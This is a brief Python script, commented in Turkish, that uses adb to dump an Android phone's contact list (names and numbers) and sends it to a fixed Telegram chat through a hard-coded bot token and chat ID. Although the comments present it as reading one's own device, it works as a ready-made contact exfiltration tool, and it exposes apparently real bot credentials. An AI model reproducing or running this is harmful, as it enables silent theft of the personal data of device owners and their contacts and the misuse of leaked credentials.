import subprocess
import telebot
import re

TOKEN = '7031744557:AAE0EjmV6Dyj9j_c4BaGagv3EzU1AqqzDp0'
TELEGRAM_ID = '7266447024'

bot = telebot.TeleBot(TOKEN)

def get_contacts():
    try:
        # Termux'ta adb kullanarak Android cihazınızın rehber bilgilerini alıyoruz
        result = subprocess.run(
            ['adb', 'shell', 'content', 'query', '--uri', 'content://contacts/phones/', '--projection', 'display_name:number'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        if result.returncode == 0:
            contacts = result.stdout.decode('utf-8')
            # Rehber verilerini formatlayarak düzenleme
            formatted_contacts = re.sub(r'Row \d+: ', '', contacts)
            return formatted_contacts
        else:
            error = result.stderr.decode('utf-8')
            print("Hata oluştu:", error)
            return None
    except Exception as e:
        print("Beklenmeyen bir hata oluştu:", e)
        return None

def send_contacts_via_telegram(contacts):
    if contacts:
        try:
            message = "Rehber Kişileri:\n" + contacts
            bot.send_message(TELEGRAM_ID, message)
        except Exception as e:
            print("Telegram mesajı gönderilirken bir hata oluştu:", e)
    else:
        try:
            bot.send_message(TELEGRAM_ID, "Rehber bilgilerini alırken bir hata oluştu.")
        except Exception as e:
            print("Telegram mesajı gönderilirken bir hata oluştu:", e)

if __name__ == "__main__":
    contacts = get_contacts()
    send_contacts_via_telegram(contacts)
